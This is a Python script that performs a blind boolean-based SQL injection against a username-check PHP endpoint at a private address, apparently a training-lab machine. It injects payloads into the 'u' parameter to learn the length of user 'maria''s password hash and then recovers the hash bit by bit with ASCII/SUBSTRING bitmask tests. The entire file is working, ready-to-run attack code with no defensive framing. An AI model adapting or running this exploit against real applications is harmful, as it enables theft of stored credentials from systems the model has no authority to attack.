import requests
import sys

# Target information
url = "http://10.129.204.197/api/check-username.php"
user = "maria"

# Proxy configuration (optional, for Burp Suite or other proxies)
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

# Function to determine the length of the password hash
def find_hash_length():
    print("[+] Determining the password hash length...")
    for length in range(1, 100):  # Assuming the hash length won't exceed 100
        payload = f"{user}' AND len(password)={length}-- -"
        response = requests.get(url, params={"u": payload}, proxies=proxies, verify=False)
    
        if "taken" in response.text:
            print(f"[+] Hash length determined: {length}")
            return length
    
    raise Exception("[-] Could not determine hash length.")

# Function to extract a single character using SQL AND-ing
def extract_char_with_sql_anding(position):
    char_ascii = 0  # Initialize character's ASCII value as 0
    print(f"[*] Extracting character at position {position}...")
    
    # Loop through each bit (from least significant bit to most significant bit)
    for bit in range(7):  # Only need 7 bits because ASCII values are < 128
        bitmask = 1 << bit  # Calculate 2^bit

        # SQL injection payload to check if the bit is set
        payload = f"{user}' AND (ASCII(SUBSTRING(password,{position},1)) & {bitmask}) > 0-- -"
        response = requests.get(url, params={"u": payload}, proxies=proxies, verify=False)
        
        if "taken" in response.text:  # If the bit is set, add its value to the ASCII character
            char_ascii |= bitmask  # Set the bit in the character's ASCII value
    
    char = chr(char_ascii)  # Convert ASCII value to character
    print(f"[+] Found character at position {position}: {char}")
    
    return char

# Function to extract the full hash using SQL AND-ing
def extract_hash_with_sql_anding(hash_length):
    print("[+] Starting hash extraction using SQL AND-ing...")
    
    extracted_hash = ""
    for position in range(1, hash_length + 1):
        char = extract_char_with_sql_anding(position)
        extracted_hash += char
        # Print the hash progress in real time
        print(f"[!] Hash so far: {extracted_hash}")
    
    return extracted_hash

if __name__ == "__main__":
    try:
        # Step 1: Find the length of the hash
        hash_length = find_hash_length()

        # Step 2: Extract the full hash using SQL AND-ing
        password_hash = extract_hash_with_sql_anding(hash_length)

        print(f"\n[+] Final Extracted Hash: {password_hash}")

    except Exception as e:
        print(str(e))
